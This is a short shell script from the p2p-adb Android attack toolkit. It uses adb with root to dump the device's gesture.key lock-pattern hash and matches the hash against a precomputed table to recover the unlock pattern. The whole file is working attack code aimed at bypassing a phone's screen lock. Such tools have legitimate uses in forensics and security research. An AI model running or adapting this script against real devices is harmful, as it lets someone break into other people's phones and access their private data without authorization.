# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


echo $ISROOT

if [ $ISROOT -le 1 ]; then
	DATAPATH="/data/system/gesture.key"
	TEST=$(adb shell "su -c '/data/local/tmp/busybox hexdump -C  /data/system/gesture.key' | /data/local/tmp/busybox sed 's/00000000//g'|/data/local/tmp/busybox head -n 1|/data/local/tmp/busybox sed 's/ //g'  |/data/local/tmp/busybox sed 's/|.*//g'"|head -c 30)
	echo "The gesture is: "
	grep $TEST includes/gesture_hash.txt|awk {'print $1'}
else
	echo $ISROOT
fi

